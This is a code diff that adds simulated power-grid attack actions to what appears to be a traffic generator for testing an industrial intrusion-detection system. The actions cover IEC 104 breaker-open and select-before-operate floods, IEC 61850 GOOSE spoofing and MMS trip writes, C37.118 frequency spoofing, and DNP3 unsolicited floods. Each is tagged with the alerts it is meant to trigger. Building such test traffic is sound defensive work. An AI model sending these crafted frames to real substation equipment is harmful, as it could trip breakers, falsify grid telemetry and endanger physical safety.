@@ -1411,3 +1411,535 @@ def _build_bacnet_iam_apdu(
     else:
         app_vendor = bytes([0x22, (vendor_id >> 8) & 0xFF, vendor_id & 0xFF])
     return header + app_obj + app_max + app_seg + app_vendor
+
+
+# ---------------------------------------------------------------------------
+# Power-grid protocol helpers (IEC 60870-5-104, IEC 61850, IEEE C37.118, DNP3)
+# ---------------------------------------------------------------------------
+
+
+def _build_tcp_raw_packet(
+    src_ip: str,
+    dst_ip: str,
+    payload: bytes,
+    dst_port: int,
+    src_port: int = 0,
+) -> bytes:
+    """Build a raw TCP Ethernet frame for arbitrary protocol payloads."""
+    if src_port == 0:
+        src_port = random.randint(49152, 65535)
+    pkt = (
+        Ether()
+        / IP(src=src_ip, dst=dst_ip)
+        / TCP(sport=src_port, dport=dst_port, flags="PA",
+              seq=random.randint(1000, 0xFFFFFF),
+              ack=random.randint(1000, 0xFFFFFF))
+        / Raw(load=payload)
+    )
+    return pkt
+
+
+def _build_udp_raw_packet(
+    src_ip: str,
+    dst_ip: str,
+    payload: bytes,
+    dst_port: int,
+    src_port: int = 0,
+) -> bytes:
+    """Build a raw UDP Ethernet frame for arbitrary protocol payloads."""
+    if src_port == 0:
+        src_port = random.randint(49152, 65535)
+    pkt = (
+        Ether()
+        / IP(src=src_ip, dst=dst_ip)
+        / UDP(sport=src_port, dport=dst_port)
+        / Raw(load=payload)
+    )
+    return pkt
+
+
+def _build_l2_goose_frame(
+    src_mac: str,
+    payload: bytes,
+    dst_mac: str = "01:0C:CD:01:00:01",
+) -> bytes:
+    """Build a Layer-2-only IEC 61850 GOOSE Ethernet frame.
+
+    GOOSE uses EtherType 0x88B8 and is published as multicast to the
+    standard reserved range ``01:0C:CD:01:00:00`` – ``01:0C:CD:01:01:FF``.
+    """
+    pkt = Ether(src=src_mac, dst=dst_mac, type=0x88B8) / Raw(load=payload)
+    return pkt
+
+
+def _build_iec104_apci(
+    apdu_body: bytes,
+    tx_seq: int,
+    rx_seq: int,
+) -> bytes:
+    """Build an IEC 60870-5-104 I-format APCI + body.
+
+    Format: 0x68 | length | (tx_seq<<1) | (rx_seq<<1) | body
+    Sequence numbers are 15-bit; the LSB of each 16-bit field is 0
+    for I-format frames.
+    """
+    length = 4 + len(apdu_body)  # 4 control bytes + body
+    tx = (tx_seq & 0x7FFF) << 1
+    rx = (rx_seq & 0x7FFF) << 1
+    apci = struct.pack(">BBHH", 0x68, length, tx, rx)
+    return apci + apdu_body
+
+
+def _crc_ccitt(data: bytes) -> int:
+    """CRC-CCITT (poly 0x1021, init 0xFFFF) used by IEEE C37.118 frames."""
+    crc = 0xFFFF
+    for b in data:
+        crc ^= (b << 8)
+        for _ in range(8):
+            if crc & 0x8000:
+                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
+            else:
+                crc = (crc << 1) & 0xFFFF
+    return crc
+
+
+# ---------------------------------------------------------------------------
+# IEC 60870-5-104 attack actions (TCP/2404)
+# ---------------------------------------------------------------------------
+
+
+@register_action("iec104_breaker_open")
+def _iec104_breaker_open(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """Send IEC-104 I-format single command (C_SC_NA_1, type 46) to open a breaker.
+
+    Targets a substation breaker via its information object address. SCO
+    qualifier 0x81 = select-and-execute, OFF→ON transition representing
+    a remote open.
+    CV should detect: unauthorized C_SC_NA_1 command, remote breaker
+    operation from non-SCADA source.
+    """
+    unit_address = int(params.get("unit_address", 1))
+    ioa = int(params.get("ioa", 1001))
+    count = int(params.get("count", 1))
+    interval_ms = int(params.get("interval_ms", 500))
+
+    current_time = start_time_ms
+    tx_seq = random.randint(0, 0x7FFF)
+    rx_seq = random.randint(0, 0x7FFF)
+
+    for target in targets:
+        for i in range(count):
+            # ASDU: typeID=46 (C_SC_NA_1), VSQ=1 (single IO), COT=6 (Act),
+            # originator=0, common_addr (2 bytes), IOA (3 bytes), SCO (1)
+            ioa_bytes = struct.pack("<I", ioa & 0xFFFFFF)[:3]
+            asdu = (
+                struct.pack(
+                    "<BBBBH",
+                    46,            # typeID = C_SC_NA_1
+                    1,             # VSQ: SQ=0, count=1
+                    6,             # COT = Activation
+                    0,             # originator addr
+                    unit_address,  # common addr
+                )
+                + ioa_bytes
+                + bytes([0x81])    # SCO: select+execute, command state ON
+            )
+            apdu = _build_iec104_apci(asdu, tx_seq, rx_seq)
+            pkt = _build_tcp_raw_packet(
+                attacker_ip, target.ip_address, apdu, dst_port=2404,
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "iec104_breaker_open", {
+                "target_ip": target.ip_address,
+                "unit_address": unit_address,
+                "ioa": ioa,
+                "type_id": 46,
+                "cot": 6,
+                "mitre_technique": "T0855",
+            })
+            tx_seq = (tx_seq + 1) & 0x7FFF
+            current_time += interval_ms + random.randint(-50, 50)
+
+
+@register_action("iec104_select_before_operate_abuse")
+def _iec104_select_before_operate_abuse(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """Rapid IEC-104 select-then-execute pairs against a protection relay.
+
+    Issues C_SC_NA_1 with COT=7 (Activation Confirmation / Select) then
+    COT=10 (Activation Termination / Execute) as fast as possible to
+    overwhelm a relay's command-handling state machine.
+    CV should detect: SBO storm, abnormal C_SC_NA_1 rate.
+    """
+    pairs = int(params.get("pairs", 20))
+    interval_ms = int(params.get("interval_ms", 50))
+    unit_address = int(params.get("unit_address", 1))
+    ioa = int(params.get("ioa", 1001))
+
+    current_time = start_time_ms
+    tx_seq = random.randint(0, 0x7FFF)
+    rx_seq = random.randint(0, 0x7FFF)
+    ioa_bytes = struct.pack("<I", ioa & 0xFFFFFF)[:3]
+
+    for target in targets:
+        for _ in range(pairs):
+            for cot in (7, 10):  # 7=Select-confirm, 10=Execute
+                asdu = (
+                    struct.pack(
+                        "<BBBBH",
+                        46,            # typeID = C_SC_NA_1
+                        1,             # VSQ
+                        cot,           # COT
+                        0,             # originator
+                        unit_address,  # common addr
+                    )
+                    + ioa_bytes
+                    + bytes([0x81])
+                )
+                apdu = _build_iec104_apci(asdu, tx_seq, rx_seq)
+                pkt = _build_tcp_raw_packet(
+                    attacker_ip, target.ip_address, apdu, dst_port=2404,
+                )
+                yield _scapy_to_packet_event(
+                    current_time, pkt, "iec104_select_before_operate_abuse", {
+                        "target_ip": target.ip_address,
+                        "unit_address": unit_address,
+                        "ioa": ioa,
+                        "cot": cot,
+                        "mitre_technique": "T0855",
+                    },
+                )
+                tx_seq = (tx_seq + 1) & 0x7FFF
+                current_time += interval_ms + random.randint(-10, 10)
+
+
+# ---------------------------------------------------------------------------
+# IEC 61850 attack actions
+# ---------------------------------------------------------------------------
+
+
+@register_action("iec61850_goose_spoof")
+def _iec61850_goose_spoof(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """Forge GOOSE multicast frames impersonating a trusted IED.
+
+    Layer-2 only — sent to standard GOOSE multicast MAC
+    ``01:0C:CD:01:00:01`` with EtherType 0x88B8. Uses an ``IECGoosePDU``
+    tag (0x61) wrapping a credible-looking but not strictly
+    spec-compliant ASN.1-BER payload. Spoofed ``stNum`` increments
+    quickly to override the legitimate publisher.
+    CV should detect: duplicate gocbRef from new MAC, GOOSE stNum
+    inconsistency.
+    """
+    goose_id = str(params.get("goose_id", "MICOM_E01CTRL/LLN0$GO$gcb01"))
+    dataset_ref = str(params.get("dataset_ref", "MICOM_E01CTRL/LLN0$dsTrip"))
+    state_num = int(params.get("state_num", 1))
+    sq_num = int(params.get("sq_num", 0))
+    count = int(params.get("count", 50))
+    interval_ms = int(params.get("interval_ms", 20))
+
+    current_time = start_time_ms
+    # Spoofed source MAC — pick a credible Schneider/Siemens-ish OUI
+    src_mac = "00:80:F4:%02x:%02x:%02x" % (
+        random.randint(0, 255), random.randint(0, 255), random.randint(0, 255),
+    )
+
+    def _ber_visible_string(s: str, tag: int = 0x83) -> bytes:
+        data = s.encode("ascii")
+        return bytes([tag]) + _ber_encode_length(len(data)) + data
+
+    def _ber_uint(value: int, tag: int) -> bytes:
+        if value < 0x80:
+            payload = bytes([value & 0xFF])
+        elif value < 0x10000:
+            payload = struct.pack(">H", value)
+        else:
+            payload = struct.pack(">I", value)
+        return bytes([tag]) + _ber_encode_length(len(payload)) + payload
+
+    for target in targets:
+        cur_state = state_num
+        cur_sq = sq_num
+        for _ in range(count):
+            # Minimal GOOSE PDU components (context-specific tags)
+            # 0x80 gocbRef, 0x81 timeAllowedToLive, 0x82 datSet,
+            # 0x83 goID, 0x84 t (timestamp), 0x85 stNum,
+            # 0x86 sqNum, 0x87 test, 0x88 confRev, 0x89 ndsCom,
+            # 0x8A numDatSetEntries, 0xAB allData
+            goose_pdu = b""
+            goose_pdu += _ber_visible_string(goose_id, tag=0x80)
+            goose_pdu += _ber_uint(2000, tag=0x81)  # timeAllowedToLive (ms)
+            goose_pdu += _ber_visible_string(dataset_ref, tag=0x82)
+            goose_pdu += _ber_visible_string(goose_id, tag=0x83)
+            # Fake UTC time = 8 bytes
+            ts_bytes = struct.pack(">II", int(current_time / 1000), 0)
+            goose_pdu += bytes([0x84]) + _ber_encode_length(len(ts_bytes)) + ts_bytes
+            goose_pdu += _ber_uint(cur_state, tag=0x85)
+            goose_pdu += _ber_uint(cur_sq, tag=0x86)
+            goose_pdu += bytes([0x87, 0x01, 0x00])  # test=false
+            goose_pdu += _ber_uint(1, tag=0x88)     # confRev
+            goose_pdu += bytes([0x89, 0x01, 0x00])  # ndsCom=false
+            goose_pdu += _ber_uint(1, tag=0x8A)     # numDatSetEntries
+            # allData: one boolean = true (trip!)
+            all_data = bytes([0x83, 0x01, 0xFF])  # boolean TRUE
+            goose_pdu += bytes([0xAB]) + _ber_encode_length(len(all_data)) + all_data
+
+            # Wrap in IECGoosePDU (tag 0x61)
+            iec_pdu = bytes([0x61]) + _ber_encode_length(len(goose_pdu)) + goose_pdu
+
+            # GOOSE Ethernet payload header (APPID, length, reserved1, reserved2)
+            appid = 0x0001
+            goose_len = 8 + len(iec_pdu)  # header (8) + APDU
+            goose_header = struct.pack(">HHHH", appid, goose_len, 0x0000, 0x0000)
+            l2_payload = goose_header + iec_pdu
+
+            pkt = _build_l2_goose_frame(src_mac, l2_payload)
+            yield _scapy_to_packet_event(current_time, pkt, "iec61850_goose_spoof", {
+                "spoofed_src_mac": src_mac,
+                "goose_id": goose_id,
+                "dataset_ref": dataset_ref,
+                "st_num": cur_state,
+                "sq_num": cur_sq,
+                "mitre_technique": "T0830",
+            })
+            cur_sq += 1
+            if cur_sq > 50:
+                cur_state += 1
+                cur_sq = 0
+            current_time += interval_ms + random.randint(-3, 3)
+
+
+@register_action("iec61850_mms_write")
+def _iec61850_mms_write(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """MMS Write request over TCP/102 targeting a controllable data attribute.
+
+    Builds TPKT + COTP + MMS-ish bytes with a confirmed-request tag
+    (0xA1) carrying a loosely encoded Write service. Target path is
+    embedded as a visible string so packet capture matches the IEC
+    61850 functional constraint format (e.g. ``GGIO1$CO$SPCSO1$Oper``).
+    CV should detect: MMS Write to ``$CO$`` (control) data object.
+    """
+    target_path = str(params.get("target_path", "GGIO1$CO$SPCSO1$Oper"))
+    count = int(params.get("count", 5))
+    interval_ms = int(params.get("interval_ms", 400))
+
+    current_time = start_time_ms
+    invoke_id = random.randint(1, 0x7FFFFFFF)
+
+    for target in targets:
+        for _ in range(count):
+            # MMS confirmed-request (tag 0xA1) carrying a Write service
+            # Service 5 = Write (context-specific [5])
+            path_bytes = target_path.encode("ascii")
+            # ObjectName domain-specific: tag 0xA1 (domain-id + item-id)
+            domain_id = b"CTRL"
+            object_name = (
+                bytes([0xA1])
+                + _ber_encode_length(2 + len(domain_id) + 2 + len(path_bytes))
+                + bytes([0x1A]) + _ber_encode_length(len(domain_id)) + domain_id
+                + bytes([0x1A]) + _ber_encode_length(len(path_bytes)) + path_bytes
+            )
+            # VariableSpecification: [0] name
+            var_spec = bytes([0xA0]) + _ber_encode_length(len(object_name)) + object_name
+            # ListOfVariable: [0] SEQUENCE OF VariableSpecification
+            list_of_var = (
+                bytes([0xA0])
+                + _ber_encode_length(len(var_spec))
+                + var_spec
+            )
+            # ListOfData: [0] one Boolean TRUE (trip command)
+            data_item = bytes([0x83, 0x01, 0xFF])  # boolean TRUE
+            list_of_data = (
+                bytes([0xA0])
+                + _ber_encode_length(len(data_item))
+                + data_item
+            )
+            # Write-Request ::= SEQUENCE { variableAccessSpec, listOfData }
+            # Wrapped in service [5]
+            write_body = list_of_var + list_of_data
+            write_service = bytes([0xA5]) + _ber_encode_length(len(write_body)) + write_body
+            # invokeID
+            invoke_bytes = struct.pack(">I", invoke_id & 0xFFFFFFFF)
+            invoke_tag = bytes([0x02]) + _ber_encode_length(len(invoke_bytes)) + invoke_bytes
+            confirmed_body = invoke_tag + write_service
+            mms_pdu = bytes([0xA1]) + _ber_encode_length(len(confirmed_body)) + confirmed_body
+
+            # COTP DT TPDU
+            cotp = bytes([0x02, 0xF0, 0x80])
+            # TPKT header
+            total_len = 4 + len(cotp) + len(mms_pdu)
+            tpkt = struct.pack(">BBH", 0x03, 0x00, total_len)
+            payload = tpkt + cotp + mms_pdu
+
+            pkt = _build_tcp_raw_packet(
+                attacker_ip, target.ip_address, payload, dst_port=102,
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "iec61850_mms_write", {
+                "target_ip": target.ip_address,
+                "target_path": target_path,
+                "invoke_id": invoke_id,
+                "mitre_technique": "T0855",
+            })
+            invoke_id = (invoke_id + 1) & 0x7FFFFFFF
+            current_time += interval_ms + random.randint(-40, 40)
+
+
+# ---------------------------------------------------------------------------
+# IEEE C37.118 (synchrophasor) attack actions
+# ---------------------------------------------------------------------------
+
+
+@register_action("c37118_phasor_spoof")
+def _c37118_phasor_spoof(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """Forge IEEE C37.118 DATA frames over UDP/4713 with manipulated values.
+
+    Targets a Phasor Data Concentrator (PDC). Sets ``FREQ`` deviation to
+    encode an abnormal under-frequency reading (default 47.5 Hz vs
+    nominal 50 Hz) and spoofs the ``IDCODE`` of a legitimate PMU.
+    Frame structure: SYNC(2) + FRAMESIZE(2) + IDCODE(2) + SOC(4) +
+    FRACSEC(4) + STAT(2) + PHASORS(8 each) + FREQ(2) + DFREQ(2) +
+    CRC-CCITT(2).
+    CV should detect: PMU value drift, IDCODE collision, abnormal
+    frequency deviation.
+    """
+    idcode = int(params.get("idcode", 1)) & 0xFFFF
+    freq_hz = float(params.get("freq_hz", 47.5))
+    fnom = float(params.get("fnom", 50.0))
+    count = int(params.get("count", 30))
+    interval_ms = int(params.get("interval_ms", 33))  # ~30 fps
+    num_phasors = int(params.get("num_phasors", 1))
+
+    current_time = start_time_ms
+
+    for target in targets:
+        for i in range(count):
+            soc = int(current_time / 1000) & 0xFFFFFFFF
+            # FRACSEC: top byte = time quality, lower 24 bits = fractional sec
+            fracsec = (random.randint(0, 0xFFFFFF)) & 0xFFFFFF
+            stat = 0x0000  # all OK
+            # PHASORS: real + imag floats (rectangular, IEEE 754 float32)
+            phasors = b""
+            for _ in range(num_phasors):
+                real = random.uniform(-1.0, 1.0) * 7200.0  # V phase voltage
+                imag = random.uniform(-1.0, 1.0) * 7200.0
+                phasors += struct.pack(">ff", real, imag)
+            # FREQ = (freq_hz - fnom) * 1000 as int16
+            freq_int = int((freq_hz - fnom) * 1000.0)
+            freq_int = max(-32768, min(32767, freq_int))
+            dfreq = 0  # rate of change of frequency
+            # Build frame body (without SYNC, FRAMESIZE, CRC)
+            body = struct.pack(">HII", idcode, soc, fracsec)
+            body += struct.pack(">H", stat)
+            body += phasors
+            body += struct.pack(">hh", freq_int, dfreq)
+
+            # SYNC = 0xAA01 (data frame, version 1)
+            sync = 0xAA01
+            framesize = 2 + 2 + len(body) + 2  # SYNC + FRAMESIZE + body + CRC
+            head = struct.pack(">HH", sync, framesize)
+            crc_input = head + body
+            crc = _crc_ccitt(crc_input)
+            frame = head + body + struct.pack(">H", crc)
+
+            pkt = _build_udp_raw_packet(
+                attacker_ip, target.ip_address, frame, dst_port=4713,
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "c37118_phasor_spoof", {
+                "target_ip": target.ip_address,
+                "spoofed_idcode": idcode,
+                "freq_hz": freq_hz,
+                "frame_index": i,
+                "mitre_technique": "T0830",
+            })
+            current_time += interval_ms + random.randint(-2, 2)
+
+
+# ---------------------------------------------------------------------------
+# DNP3 attack actions (TCP/20000)
+# ---------------------------------------------------------------------------
+
+
+@register_action("dnp3_unsolicited_flood")
+def _dnp3_unsolicited_flood(
+    params: dict[str, Any],
+    targets: list[TargetInfo],
+    attacker_ip: str,
+    start_time_ms: float,
+) -> Iterator[PacketEvent]:
+    """Flood a DNP3 master with unsolicited responses over TCP/20000.
+
+    Builds minimal DNP3 link-layer frames (start bytes 0x05 0x64) with
+    transport + application headers indicating an unsolicited response
+    (function code 0x82). Designed to overwhelm a SCADA master's event
+    queue and obscure legitimate alarms.
+    CV should detect: DNP3 unsolicited flood, abnormal event rate.
+    """
+    count = int(params.get("count", 200))
+    interval_ms = int(params.get("interval_ms", 20))
+    src_addr = int(params.get("src_addr", 1024))
+    dst_addr = int(params.get("dst_addr", 1))
+
+    current_time = start_time_ms
+    app_seq = 0
+
+    for target in targets:
+        for i in range(count):
+            # Link layer header (10 bytes):
+            #   start: 0x05 0x64
+            #   length: 1 byte (count from CTRL through user data, +1)
+            #   ctrl: 1 byte (DIR=1, PRM=1, FCB=0, FCV=0, FC=0x4 unconfirmed user data)
+            #   dst: 2 bytes (LSB first)
+            #   src: 2 bytes (LSB first)
+            #   crc: 2 bytes (omitted/zeroed for sim purposes)
+            # Transport (1 byte): FIN=1, FIR=1, SEQ
+            # Application (3 bytes): control (CON=0, UNS=1, SEQ), func=0x82,
+            #   IIN (2 bytes)
+            transport = 0xC0 | (i & 0x3F)
+            app_ctrl = 0xD0 | (app_seq & 0x0F)  # FIR=1, FIN=1, UNS=1
+            app_func = 0x82  # Unsolicited response
+            iin = struct.pack(">H", 0x0000)
+            user_data = bytes([transport, app_ctrl, app_func]) + iin
+            # length covers ctrl + dst + src + user_data + transport-CRCs (sim: omit)
+            link_length = 5 + len(user_data)
+            link_ctrl = 0x44  # DIR=0, PRM=1, FC=4 (unconfirmed user data)
+            link_header = (
+                bytes([0x05, 0x64, link_length & 0xFF, link_ctrl])
+                + struct.pack("<HH", dst_addr & 0xFFFF, src_addr & 0xFFFF)
+                + struct.pack(">H", 0x0000)  # link CRC (zeroed)
+            )
+            frame = link_header + user_data
+
+            pkt = _build_tcp_raw_packet(
+                attacker_ip, target.ip_address, frame, dst_port=20000,
+            )
+            yield _scapy_to_packet_event(current_time, pkt, "dnp3_unsolicited_flood", {
+                "target_ip": target.ip_address,
+                "src_addr": src_addr,
+                "dst_addr": dst_addr,
+                "func_code": app_func,
+                "mitre_technique": "T0814",
+            })
+            app_seq = (app_seq + 1) & 0x0F
+            current_time += interval_ms + random.randint(-3, 3)
